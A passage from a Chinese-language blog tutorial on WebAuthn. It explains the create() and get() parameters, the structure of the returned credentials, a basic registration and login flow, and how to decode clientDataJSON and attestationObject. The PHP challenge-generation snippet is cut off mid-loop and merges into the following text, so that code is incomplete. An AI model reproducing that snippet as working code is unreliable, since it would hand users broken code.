}\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 